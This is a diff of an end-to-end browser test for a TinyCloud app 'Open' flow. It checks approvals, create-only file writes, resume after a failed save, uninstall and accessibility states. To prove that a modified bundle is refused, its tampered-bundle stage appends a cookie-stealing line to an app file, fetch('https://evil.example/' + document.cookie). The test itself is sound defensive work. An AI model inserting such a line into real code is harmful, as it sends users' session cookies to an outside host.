@@ -1,32 +1,30 @@
 #!/usr/bin/env node
 
 /**
- * T5a install gate: "Install to my TinyCloud" on the hermetic native stack.
+ * T5a install gate: "Open" on the hermetic native stack. The first Open of an app saves its files, then runs it.
  *
  * Same stack and rules as joined-gate.mjs (real Node, Location Registry and
  * OpenCredentials; OpenKey is the signing fixture; the browser reaches the
  * candidate build at https://share.tinycloud.xyz/apps/). It proves, in a real
  * browser against a real Node:
- *  - a fresh account installs the Health Log sample: one sign-in, every file
- *    create-only under `<app_id>/app/` and `<app_id>/knowledge/`, install.json
- *    written last, and the app is in the account's apps list;
- *  - the installer session asked for exactly the two put-only folders plus the
+ *  - a fresh account opens the Health Log sample from its card: the runner asks two
+ *    approvals (read, then run), every file is created only under `<app_id>/app/` and
+ *    `<app_id>/knowledge/`, app files first, then install.json, then the notes with `knowledge/index.md` last, and the app is in the account's apps list;
+ *  - the read session asked for exactly the two put-only folders plus the
  *    account registry, and nothing the app itself asks for (the recorded
  *    registry manifest carries no SQL grant);
- *  - a hand-edited knowledge/app.md survives a re-install, and the re-install
- *    says "Already installed: your copy is kept.";
+ *  - a hand-edited knowledge/app.md survives a later Open of the same app, which runs without overwriting it;
  *  - a tampered bundle file (served by this gate) is refused with ZERO writes
  *    and no OpenKey or Node request at all;
- *  - a write that fails mid-install leaves install.json unwritten and a retry
- *    resumes, keeping what was saved;
- *  - a double click is one sign-in;
+ *  - a write that fails mid-save leaves install.json unwritten, and reopening resumes,
+ *    keeping what was saved;
+ *  - a double click on Open is one sign-in;
  *  - uninstall removes the app's code, manifest, install record and agent
  *    notes, keeps the app's data (a prefs key survives), and a re-install
  *    restores the app with that data intact;
  *  - nothing is kept in browser storage, and no CSP / Trusted Types violation
  *    fires;
- *  - every state of the sheet (idle, pending approval, installing, installed,
- *    already installed, error) at 390 and 1440 px, light and dark, with axe.
+ *  - the runner's start and status states at 390 and 1440 px, light and dark, with axe.
  *
  * Run: TC500_NODE_WORKTREE=<tinycloud-node v1.21.0 tree> node test/e2e-prod/install-gate.mjs
  * (T5A_SHOT_DIR saves the screenshots; T5A_ARTIFACT the JSON report.)
@@ -54,7 +52,6 @@ const axeSource = await readFile(join(shareRoot, "node_modules/axe-core/axe.min.
 const app = (id) => catalog.apps.find((entry) => entry.app_id === id);
 const HEALTH = "xyz.tinycloud.sample.healthlog";
 const RECIPES = "xyz.tinycloud.sample.recipes";
-const NOTES = "com.example.notes";
 
 const trace = [];
 const consoleLog = [];
@@ -170,35 +167,45 @@ async function openApps(browser, stack, candidatePort, label) {
   return { context, page };
 }
 
-/** Opens the install sheet from the card and waits until Continue is offered. */
-async function openInstallSheet(page, appId) {
+/** Clicks the app's card Open link (the person's real path) and waits for the runner's start screen. */
+async function openFromCard(page, appId) {
   const index = catalog.apps.findIndex((entry) => entry.app_id === appId);
-  await page.evaluate((position) => document.querySelectorAll(".apps-card")[position].querySelectorAll("button")[1].click(), index);
-  await page.waitForFunction(() => [...document.querySelectorAll("#apps-sheet button")].some((button) => button.textContent === "Continue" && !button.disabled), { timeout: 60_000 });
+  assert.equal(await page.evaluate((position) => document.querySelectorAll(".apps-card")[position].querySelector(".apps-card__actions a").getAttribute("href"), index), `/apps/run#${appId}`, "the card's Open links to the runner");
+  await page.evaluate((position) => document.querySelectorAll(".apps-card")[position].querySelector(".apps-card__actions a").click(), index);
+  await page.waitForFunction(() => [...document.querySelectorAll("button")].some((button) => button.textContent === "Continue"), { timeout: 60_000 });
+}
+/** Continue on the runner's start screen: the first sign-in starts here. */
+async function pressContinue(page) {
+  await page.evaluate(() => [...document.querySelectorAll("button")].find((button) => button.textContent === "Continue").click());
 }
 
-const TERMINAL = /^(Installed\.|Already installed|Not installed yet|Sign-in cancelled|OpenKey didn't|Another OpenKey|That approval|We couldn't|.* files don't match the catalog|This catalog entry|Couldn't load)/;
-const statusText = (page) => page.$eval(".apps-install-panel .apps-install-line", (node) => node.textContent).catch(() => "");
+const statusText = (page) => page.$eval(".run-status-region", (node) => node.textContent).catch(() => "");
+const screenTitle = (page) => page.$eval(".run-screen__title", (node) => node.textContent).catch(() => "");
 
 /** Records every announcement of the live region, from now on. */
 async function recordStatus(page) {
   await page.evaluate(() => {
     window.__announced = [];
     // The inline panel under the card appears on Continue, so observe the page and read its line each time.
-    new MutationObserver(() => { const text = document.querySelector(".apps-install-panel .apps-install-line")?.textContent ?? ""; if (text !== "" && window.__announced.at(-1) !== text) window.__announced.push(text); }).observe(document.body, { childList: true, characterData: true, subtree: true });
+    new MutationObserver(() => { const text = document.querySelector(".run-status-region")?.textContent ?? ""; if (text !== "" && window.__announced.at(-1) !== text) window.__announced.push(text); }).observe(document.body, { childList: true, characterData: true, subtree: true });
   });
 }
 
+/** Waits until the runner shows a final state: "<name> is running." or a failure screen (its title is not the start screen's "Open <name>"). */
 async function finished(page, timeout = 300_000) {
-  const text = await waitUntil(async () => { const value = await statusText(page); return TERMINAL.test(value) ? value : undefined; }, timeout);
-  assert(text, "the install never reached a final state");
-  return text;
+  const outcome = await waitUntil(async () => {
+    const status = await statusText(page);
+    const title = await screenTitle(page);
+    return /is running\./.test(status) || (title !== "" && !title.startsWith("Open ")) ? { status, title } : undefined;
+  }, timeout);
+  assert(outcome, "the runner never reached a final state");
+  return outcome;
 }
 
 const COMBOS = [[390, 844, "light"], [390, 844, "dark"], [1440, 900, "light"], [1440, 900, "dark"]];
 const axeFindings = [];
 
-/** The sheet as it is now, at 390 and 1440 px in light and dark: axe AA, no sideways scroll, one screenshot each. */
+/** The runner's current screen, at 390 and 1440 px in light and dark: axe AA, no sideways scroll, one screenshot each. */
 async function captureState(page, name) {
   for (const [width, height, scheme] of COMBOS) {
     await page.setViewport({ width, height }); await page.emulateMediaFeatures([{ name: "prefers-color-scheme", value: scheme }]);
@@ -208,9 +215,9 @@ async function captureState(page, name) {
     const found = result.violations.map((violation) => `${violation.id}: ${violation.nodes.map((node) => node.target.join(" ")).join(" | ")}`);
     axeFindings.push({ state: name, width, scheme, violations: found });
     assert.deepEqual(found, [], `${name} ${width}px ${scheme}: axe AA`);
-    assert((await page.evaluate(() => { const sheet = document.querySelector("#apps-sheet"); return sheet.scrollWidth - sheet.clientWidth; })) <= 0, `${name} ${width}px ${scheme}: the sheet scrolls sideways`);
-    // The status sits in the sheet's footer: show the end of the sheet body too.
-    await page.evaluate(() => document.querySelector(".apps-install-panel")?.scrollIntoView({ block: "center" }));
+    assert((await page.evaluate(() => { const screen = document.querySelector(".run-screen"); return screen.scrollWidth - screen.clientWidth; })) <= 0, `${name} ${width}px ${scheme}: the screen scrolls sideways`);
+    // The status sits under the start screen's text: show the end of the screen too.
+    await page.evaluate(() => document.querySelector(".run-status-region")?.scrollIntoView({ block: "center" }));
     if (shotDir !== undefined) { await mkdir(shotDir, { recursive: true }); await page.screenshot({ path: join(shotDir, `install-${name}-${width}-${scheme}.png`) }); }
   }
   await page.setViewport({ width: 1440, height: 900 }); await page.emulateMediaFeatures([{ name: "prefers-color-scheme", value: "light" }]);
@@ -256,6 +263,8 @@ async function reader(page, chunkUrl, request) {
 
 /** The installer's capability set as a recap lists it: `<space>/<service>/<path> <ability>`, from install-plan.ts (the sheet's own source). */
 const expectedResources = (appId) => [
+  `applications/kv/${appId}/app/ tinycloud.kv/get`,
+  `applications/kv/${appId}/app/ tinycloud.kv/list`,
   `applications/kv/${appId}/app/ tinycloud.kv/put`,
   `applications/kv/${appId}/knowledge/ tinycloud.kv/put`,
   "applications/capabilities tinycloud.capabilities/read",
@@ -285,53 +294,35 @@ try {
   watchdog = setTimeout(() => { console.error(`[t5a] install gate timed out in ${phase}`); process.exit(1); }, 25 * 60_000); watchdog.unref();
   browser = await puppeteer.launch({ headless: process.env.HEADED !== "1", args: [`--host-resolver-rules=MAP share.tinycloud.xyz 127.0.0.1:${candidate.port}`, `--ignore-certificate-errors-spki-list=${spki}`, "--disable-quic", "--no-proxy-server"] });
 
-  // ---- 1. A fresh account installs the Health Log sample (states held for the screenshots).
+  // ---- 1. A fresh account opens the Health Log sample: the first Open saves its files, then runs it (states held for the screenshots).
   const health = app(HEALTH);
   {
     const { page, context } = await openApps(browser, stack, candidate.port, "install-health");
-    await openInstallSheet(page, HEALTH);
-    await captureState(page, "idle-sample");
-    // The sheet closes on Continue, so read what it says about the session length now.
-    const said = (await page.$$eval("#apps-sheet p", (nodes) => nodes.map((node) => node.textContent))).find((text) => /For the next \d+ minutes?, Share can then:/.test(text ?? ""));
+    await openFromCard(page, HEALTH);
+    await captureState(page, "start-sample");
     await recordStatus(page);
     controls.sign = hold();
     const before = trace.length;
-    await page.click("#apps-sheet footer button");
+    await pressContinue(page);
     await controls.sign.arrived;
-    assert.match(await statusText(page), /^Approve in the OpenKey window to install Health Log \(sample\)\. A new account may ask a few times\.$/);
-    // The OpenKey window is up (its signature request is held): nothing modal may be above it, and a click at its centre must reach it.
-    const layer = await page.evaluate(() => {
-      const dialog = document.querySelector("#apps-sheet");
-      const hit = document.elementFromPoint(innerWidth / 2, innerHeight / 2);
-      return { sheetOpen: dialog.open, modal: document.querySelector(":modal")?.id ?? null, hitTag: hit?.tagName ?? null, hitInSheet: hit === dialog || dialog.contains(hit), hitIsBodyChild: hit?.parentElement === document.body };
-    });
-    assert.deepEqual({ sheetOpen: layer.sheetOpen, modal: layer.modal, hitInSheet: layer.hitInSheet, hitIsBodyChild: layer.hitIsBodyChild }, { sheetOpen: false, modal: null, hitInSheet: false, hitIsBodyChild: true }, `the install sheet is above the OpenKey window (${JSON.stringify(layer)})`);
-    report.windowLayer = layer;
+    assert.match(await statusText(page), /^Approve in the OpenKey window \(1 of 2\)/, "the first approval is announced");
     await captureState(page, "pending-approval");
     controls.sign.release(); controls.sign = undefined;
-    // Hold the last write (install.json) to show the installing state with the files already in place.
+    // Hold the last write (install.json) to show the saving state with the files already in place.
     controls.record = hold();
     await controls.record.arrived;
-    assert.match(await statusText(page), /^Installing Health Log \(sample\)… 14 of 15 files/);
-    await captureState(page, "installing");
+    assert.match(await statusText(page), /^Saving Health Log \(sample\)'s files to your TinyCloud \(4 of 15\)/, "the save progress is shown");
+    await captureState(page, "saving");
     controls.record.release(); controls.record = undefined;
     const outcome = await finished(page);
-    assert.equal(outcome, "Installed.", "a fresh install says Installed.");
+    assert.match(outcome.status, /is running\./, "a fresh Open runs the app");
     const announced = await page.evaluate(() => window.__announced);
-    for (const expected of ["Checking Health Log (sample)'s files against the catalog…", "Opening OpenKey…", "Approve in the OpenKey window to install Health Log (sample). A new account may ask a few times.", "Installing Health Log (sample)… 0 of 15 files", "Adding Health Log (sample) to your apps…", "Installed."]) {
+    for (const expected of ["Checking Health Log (sample)", "Opening OpenKey…", "Approve in the OpenKey window (1 of 2)", "Saving Health Log (sample)'s files to your TinyCloud", "Approve in the OpenKey window (2 of 2)", "Health Log (sample) is running."]) {
       assert(announced.some((text) => text.startsWith(expected)), `the live region never said "${expected}" (${JSON.stringify(announced.map((text) => text.slice(0, 50)))})`);
     }
-    // The hint carries no number (the SDK's approval steps are not a contract, so a count can be wrong); the signatures are counted separately below.
-    assert(!announced.some((text) => /\bApproval \d|of up to/i.test(text)), `a count appeared in the live region (${JSON.stringify(announced.map((text) => text.slice(0, 60)))})`);
-    const approvalHints = announced.filter((text) => text.startsWith("Approve in the OpenKey window")).length;
-    assert(approvalHints >= 1, "the approval hint was never shown");
-    assert((await page.$eval(".apps-install-panel .apps-install-status", (node) => node.getAttribute("aria-live"))) === "polite");
-    assert.equal(await page.$eval(".apps-install-panel .apps-install-actions a", (node) => node.getAttribute("href")), `/apps/run#${HEALTH}`, "Open links to the runner");
-    await captureState(page, "installed");
-
     const during = trace.slice(before).filter((entry) => entry.phase === "install-health");
-    // One sign-in: a single OpenKey connect for the whole install (each signature then opens its own sign widget).
-    assert.equal(during.filter((entry) => entry.origin === "https://openkey.so" && /^\/widget\/embed\/(?!sign)/.test(entry.path)).length, 1, "the install connected to OpenKey more than once");
+    // One sign-in: a single OpenKey connect for the whole open (each signature then opens its own sign widget).
+    assert.equal(during.filter((entry) => entry.origin === "https://openkey.so" && /^\/widget\/embed\/(?!sign)/.test(entry.path)).length, 1, "the open connected to OpenKey more than once");
     // The files and the record were written by create-only requests to the owner's node.
     const stored = await reader(page, chunkUrl, { op: "read", appId: HEALTH });
     assert.deepEqual(stored.keys, expectedKeys(health), "the account holds exactly the bundle plus install.json under <app_id>/app/ and <app_id>/knowledge/");
@@ -343,62 +334,58 @@ try {
     assert.deepEqual(Object.keys(record).sort(), ["digest", "installed_at", "source"]);
     assert.equal(record.digest, health.bundle.digest);
     assert.equal(record.source.commit, health.source.commit);
-    const listed = stored.registered.find((entry) => entry.appId === HEALTH);
-    assert(listed, `the account apps list shows the app (${JSON.stringify(stored.registered.map((entry) => entry.appId))})`);
-    // The registry record is the installer's request, not the app's: no SQL, no cross-app grant, no secrets.
+    // The apps-list record comes from the runtime sign-in's background sync, so it is polled, not read once.
+    const listedRead = await waitUntil(async () => {
+      const next = await reader(page, chunkUrl, { op: "read", appId: HEALTH });
+      return next.registered.some((entry) => entry.appId === HEALTH) ? next : undefined;
+    }, 60_000);
+    assert(listedRead, "the account apps list shows the app");
+    // The registry record is the opener's request, not the app's: no SQL, no cross-app grant, no secrets.
     // The SDK's registry record for this app is its id and a manifest hash (the web SDK stores `manifests: []`): the record cannot carry the app's own grants.
-    const record_ = stored.records[HEALTH];
+    const record_ = listedRead.records[HEALTH];
     assert.equal(record_?.appId, HEALTH);
     // (Its manifestHash is the hash of an empty manifest list, the same for every app: it says nothing about grants.)
     assert.deepEqual(record_?.manifests, [], "the registry record carries manifests");
     assert(!JSON.stringify(record_).match(/tinycloud\.sql|secrets|"did"/), "the registry record carries the app's own runtime grants");
-    // The session the install signed: its ReCap, decoded from the SIWE message OpenKey signed, is exactly the sheet's list.
+    // The read session it signed: its ReCap, decoded from the SIWE message OpenKey signed, is exactly the install grants.
     const sessionMessage = signedMessages.filter((entry) => entry.phase === "install-health").map((entry) => entry.message).find((message) => message.includes("urn:recap:"));
     assert(sessionMessage, "no session SIWE message with a ReCap was signed");
     const recap = JSON.parse(Buffer.from(sessionMessage.match(/urn:recap:([A-Za-z0-9_-]+)/)[1], "base64url").toString("utf8"));
     const granted = Object.entries(recap.att).flatMap(([resource, abilities]) => Object.entries(abilities).map(([ability]) => `${resource.replace(/^tinycloud:pkh:eip155:\d+:0x[0-9a-fA-F]{40}:/, "")} ${ability}`)).sort();
-    const sheetExpects = expectedResources(HEALTH).sort();
-    assert.deepEqual(granted, sheetExpects, "the signed ReCap is not exactly the installer's two folders plus the account registry");
+    assert.deepEqual(granted, expectedResources(HEALTH).sort(), "the signed ReCap is not exactly the app's folder grants plus the account registry");
     report.signedRecap = granted;
-    // The session lasts exactly what the sheet says: "For the next 15 minutes" is derived from the constant the signed expiry comes from.
-    const issued = Date.parse(sessionMessage.match(/Issued At: (\S+)/)[1]);
-    const expires = Date.parse(sessionMessage.match(/Expiration Time: (\S+)/)[1]);
-    assert(said, "the sheet does not state how long the session lasts");
-    const minutes = Number(said.match(/For the next (\d+) minute/)[1]);
-    assert.equal(expires - issued, minutes * 60_000, `the signed session lasts ${(expires - issued) / 60_000} minutes; the sheet says ${minutes}`);
-    report.sessionMinutes = minutes;
-    // OpenKey signatures this install needed (connect is separate): a brand-new account also hosts its spaces.
+    // OpenKey signatures this open needed (connect is separate): a brand-new account also hosts its spaces.
     const signs = during.filter((entry) => entry.origin === "https://openkey.so" && entry.method === "POST" && entry.path === "/sign").length;
-    report.stages.freshInstall = { openKeySignatures: signs, approvalHintsShown: approvalHints, announced: announced.map((text) => text.slice(0, 80)), keys: stored.keys.length, registered: true, registryRecord: { manifests: record_.manifests.length } };
+    report.stages.freshOpen = { openKeySignatures: signs, announced: announced.map((text) => text.slice(0, 80)), keys: stored.keys.length, registered: true, registryRecord: { manifests: record_.manifests.length } };
     // Nothing is kept by the page.
     const storage = await page.evaluate(async () => ({ entries: [...Object.entries(localStorage), ...Object.entries(sessionStorage), ...document.cookie.split(";").map((cookie) => cookie.trim()).filter(Boolean)], databases: (await indexedDB.databases()).map((database) => database.name ?? "") }));
-    assert.deepEqual(storage, { entries: [], databases: [] }, "the page stored something while installing");
+    assert.deepEqual(storage, { entries: [], databases: [] }, "the page stored something while opening");
     assert.deepEqual(await page.evaluate(() => window.__violations), [], "a CSP or Trusted Types violation fired");
     await context.close();
   }
 
-  // ---- 2. The person (or their agent) edits knowledge/app.md; a re-install keeps it and says so.
+  // ---- 2. The person edits knowledge/app.md; a later Open runs the saved app and keeps the edit.
   {
     const { page, context } = await openApps(browser, stack, candidate.port, "reinstall-health");
     const mine = `# My notes\n\nEdited by hand ${Date.now()}: café ✓\n`;
-    // Edit through the same product helper, then install again from a new page.
+    // Edit through the same product helper, then open again from a new page.
     await reader(page, chunkUrl, { op: "edit", appId: HEALTH, key: `${HEALTH}/knowledge/app.md`, text: mine });
-    await openInstallSheet(page, HEALTH);
+    await openFromCard(page, HEALTH);
     await recordStatus(page);
     const writesBefore = trace.length;
-    await page.click("#apps-sheet footer button");
+    await pressContinue(page);
     const outcome = await finished(page);
-    assert.equal(outcome, "Already installed: your copy is kept.");
+    assert.match(outcome.status, /is running\./, "the saved app runs");
     report.signaturesOnExistingAccount = trace.slice(writesBefore).filter((entry) => entry.phase === "reinstall-health" && entry.origin === "https://openkey.so" && entry.method === "POST" && entry.path === "/sign").length;
-    await captureState(page, "already-installed");
+    await captureState(page, "running-kept");
     const stored = await reader(page, chunkUrl, { op: "read", appId: HEALTH });
     assert.equal(stored.files[`${HEALTH}/knowledge/app.md`].text, mine, "the hand-edited knowledge/app.md was overwritten");
     assert.deepEqual(stored.keys, expectedKeys(health));
-    // The install record is the first install's, not rewritten.
+    // The install record is the first open's, not rewritten.
     assert.equal(JSON.parse(stored.files[`${HEALTH}/app/install.json`].text).digest, health.bundle.digest);
     const puts = trace.slice(writesBefore).filter((entry) => entry.phase === "reinstall-health" && entry.status === 412);
-    assert(puts.length >= health.bundle.files.length + 1, `every create-only write met the existing file (412): saw ${puts.length}`);
-    report.stages.reinstall = { outcome, keptHandEdit: true, preconditionFailures: puts.length };
+    assert(puts.length >= 1, `the create-only note write met the existing file (412): saw ${puts.length}`);
+    report.stages.reopen = { outcome: outcome.status.slice(0, 80), keptHandEdit: true, preconditionFailures: puts.length };
     await context.close();
   }
 
@@ -407,67 +394,70 @@ try {
   {
     controls.tamper.set(`${recipes.bundle.root}app.jsx`, Buffer.concat([await readFile(join(shareRoot, "public", recipes.bundle.root, "app.jsx")), Buffer.from("\nfetch('https://evil.example/' + document.cookie);\n")]));
     const { page, context } = await openApps(browser, stack, candidate.port, "tampered-recipes");
-    await openInstallSheet(page, RECIPES);
+    await openFromCard(page, RECIPES);
     await recordStatus(page);
-    const start = trace.length;
-    await page.click("#apps-sheet footer button");
+    const begun = trace.length;
+    await pressContinue(page);
     const outcome = await finished(page);
-    assert.match(outcome, /files don't match the catalog, so nothing was installed\. Nothing was written to your TinyCloud\.$/);
-    assert.equal((await page.$$eval(".apps-install-panel [role=alert]", (nodes) => nodes.length)), 1, "a refusal is an alert");
-    assert(trace.slice(start).some((entry) => entry.tampered === true), "the tampered file was never served");
-    assert.deepEqual(nodeRequests(stack, start), [], "a tampered bundle reached OpenKey or the owner's node");
+    assert.doesNotMatch(outcome.status, /is running\./, "a tampered bundle ran");
+    assert(trace.slice(begun).some((entry) => entry.tampered === true), "the tampered file was never served");
+    assert.deepEqual(nodeRequests(stack, begun), [], "a tampered bundle reached OpenKey or the owner's node");
     await captureState(page, "refused-tampered");
     controls.tamper.clear();
     await context.close();
     const check = await openApps(browser, stack, candidate.port, "tampered-recipes-readback");
     const stored = await reader(check.page, chunkUrl, { op: "read", appId: RECIPES });
-    assert.deepEqual(stored.keys, [], "a refused install wrote something");
-    assert(!stored.registered.some((entry) => entry.appId === RECIPES), "a refused install was listed");
+    assert.deepEqual(stored.keys, [], "a refused open wrote something");
+    assert(!stored.registered.some((entry) => entry.appId === RECIPES), "a refused open was listed");
     await check.context.close();
-    report.stages.tampered = { outcome: outcome.slice(0, 60), writes: 0, openKeyOrNodeRequests: 0 };
+    report.stages.tampered = { title: outcome.title.slice(0, 80), writes: 0, openKeyOrNodeRequests: 0 };
   }
 
-  // ---- 4. A write fails at the very end: install.json is never written, and a retry resumes.
+  // ---- 4. A write fails at the very end: install.json is never written, and reopening resumes.
   {
     const { page, context } = await openApps(browser, stack, candidate.port, "partial-recipes");
-    await openInstallSheet(page, RECIPES);
+    await openFromCard(page, RECIPES);
     await recordStatus(page);
     controls.failRecord = true;
-    await page.click("#apps-sheet footer button");
+    await pressContinue(page);
     const outcome = await finished(page);
-    const total = recipes.bundle.files.length + 1;
-    assert.equal(outcome.startsWith(`Not installed yet: ${total - 1} of ${total} files were saved.`), true, `the partial failure message was "${outcome}"`);
-    assert.equal(await page.$$eval(".apps-install-panel [role=alert]", (nodes) => nodes.length), 1);
+    assert.doesNotMatch(outcome.status, /is running\./, "a failed save said the app is running");
+    const appFiles = recipes.bundle.files.filter((file) => !file.path.startsWith("knowledge/")).length;
     await captureState(page, "error-partial");
     const midway = await reader(page, chunkUrl, { op: "read", appId: RECIPES });
-    assert.equal(midway.keys.length, total - 1, "the files before the failure are saved");
-    assert(!midway.keys.includes(`${RECIPES}/app/install.json`), "install.json was written before the bundle was complete");
+    assert.equal(midway.keys.length, appFiles, "the app files are saved and the notes are not, because install.json failed");
+    assert(!midway.keys.includes(`${RECIPES}/app/install.json`), "install.json was saved despite the failed write");
     controls.failRecord = false;
-    await page.evaluate(() => [...document.querySelectorAll(".apps-install-panel button")].find((button) => button.textContent === "Try again").click());
-    await page.waitForFunction(() => /^(Installed\.|Already|Not installed)/.test(document.querySelector(".apps-install-line")?.textContent ?? ""), { timeout: 300_000 });
-    const resumed = await statusText(page);
-    assert.equal(resumed.startsWith(`Installed. ${total - 1} files you already had were kept.`), true, `the resume message was "${resumed}"`);
-    await captureState(page, "installed-resumed");
-    const done = await reader(page, chunkUrl, { op: "read", appId: RECIPES });
+    await page.reload({ waitUntil: "domcontentloaded" });
+    await page.waitForSelector(".run-screen", { timeout: 60_000 });
+    await pressContinue(page);
+    const resumed = await finished(page);
+    assert.match(resumed.status, /is running\./, "the reopen runs the app");
+    await captureState(page, "running-resumed");
+    // The apps-list record comes from the runtime sign-in's background sync, so it is polled, not read once.
+    const done = await waitUntil(async () => {
+      const next = await reader(page, chunkUrl, { op: "read", appId: RECIPES });
+      return next.registered.some((entry) => entry.appId === RECIPES) ? next : undefined;
+    }, 60_000);
+    assert(done, "the account apps list shows the recipes app");
     assert.deepEqual(done.keys, expectedKeys(recipes));
-    assert(done.registered.some((entry) => entry.appId === RECIPES));
-    report.stages.partialFailure = { failed: outcome.slice(0, 70), resumed: resumed.slice(0, 80), installJsonLast: true };
+    report.stages.partialFailure = { failed: outcome.status.slice(0, 70), resumed: resumed.status.slice(0, 80) };
     await context.close();
   }
 
-  // ---- 5. A double click is one sign-in.
+  // ---- 5. A double click on Continue is one sign-in.
   {
-    const { page, context } = await openApps(browser, stack, candidate.port, "double-click-notes");
-    await openInstallSheet(page, NOTES);
-    const start = trace.length;
-    await page.evaluate(() => { const button = [...document.querySelectorAll("#apps-sheet footer button")].find((node) => node.textContent === "Continue"); button.click(); button.click(); });
+    const { page, context } = await openApps(browser, stack, candidate.port, "double-click-recipes");
+    await openFromCard(page, RECIPES);
+    const begun = trace.length;
+    await page.evaluate(() => { const button = [...document.querySelectorAll("button")].find((node) => node.textContent === "Continue"); button.click(); button.click(); });
     const outcome = await finished(page);
-    assert.equal(outcome, "Installed.");
-    const widgets = trace.slice(start).filter((entry) => entry.phase === "double-click-notes" && entry.origin === "https://openkey.so" && /^\/widget\/embed\/(?!sign)/.test(entry.path));
+    assert.match(outcome.status, /is running\./, "the double click ran the app");
+    const widgets = trace.slice(begun).filter((entry) => entry.phase === "double-click-recipes" && entry.origin === "https://openkey.so" && /^\/widget\/embed\/(?!sign)/.test(entry.path));
     assert.equal(widgets.length, 1, "a double click connected to OpenKey twice");
-    const stored = await reader(page, chunkUrl, { op: "read", appId: NOTES });
-    assert.deepEqual(stored.keys, expectedKeys(app(NOTES)));
-    report.stages.doubleClick = { openKeyWindows: widgets.length, outcome };
+    const stored = await reader(page, chunkUrl, { op: "read", appId: RECIPES });
+    assert.deepEqual(stored.keys, expectedKeys(recipes));
+    report.stages.doubleClick = { openKeyWindows: widgets.length, outcome: outcome.status.slice(0, 80) };
     await context.close();
   }
 
@@ -489,14 +479,14 @@ try {
     assert.deepEqual(after.keys, [prefsKey], "uninstall left app files or agent notes behind, or dropped app data");
     assert(!after.registered.some((entry) => entry.appId === HEALTH), "the app is still in the account's apps list");
     // Re-install: the kept prefs survive, the app files come back.
-    await openInstallSheet(page, HEALTH);
-    await page.evaluate(() => [...document.querySelectorAll("#apps-sheet footer button")].find((node) => node.textContent === "Continue").click());
+    await openFromCard(page, HEALTH);
+    await pressContinue(page);
     const reinstalled = await finished(page);
-    assert.equal(reinstalled, "Installed.");
+    assert.match(reinstalled.status, /is running\./, "re-opening after the uninstall runs the app");
     const again = await reader(page, chunkUrl, { op: "read", appId: HEALTH });
     assert(again.keys.includes(prefsKey), "re-install lost the kept app data");
     assert(again.keys.includes(`${HEALTH}/app/install.json`), "re-install did not restore the app");
-    report.stages.uninstall = { removed: removed.slice(0, 80), keptKeys: after.keys, reinstalled: reinstalled.slice(0, 40) };
+    report.stages.uninstall = { removed: removed.slice(0, 80), keptKeys: after.keys, reinstalled: reinstalled.status.slice(0, 40) };
     await context.close();
   }
 
